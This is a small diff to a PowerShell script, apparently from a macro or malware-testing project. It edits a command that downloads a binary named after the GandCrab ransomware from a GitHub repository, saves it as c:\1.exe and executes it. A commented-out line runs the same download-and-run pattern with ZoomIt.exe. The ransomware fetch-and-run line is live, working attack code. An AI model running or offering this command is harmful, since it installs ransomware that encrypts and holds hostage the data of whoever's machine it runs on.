@@ -1,4 +1,4 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
-Invoke-WebRequest -Uri https://github.com/lpiacono/officemacro/raw/master/GandCrab-d6cdd31e2a4294fead1761c7f56b7d6894b1cba967e9161ca806717c679f4634.bin -OutFile c:\1.exe; & c:\1.exe;
+Invoke-WebRequest -Uri https://github.com/lpiacono/officemacro/raw/master/GandCrab-d6cdd31e2a4294fead1761c7f56b7d6894b1cba967e9161ca806717c679f4634.bin -OutFile c:\1.exe; & 'c:\1.exe';
 
 #[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri https://github.com/lpiacono/officemacro/raw/master/ZoomIt.exe -OutFile c:\1.exe; & 'c:\1.exe'
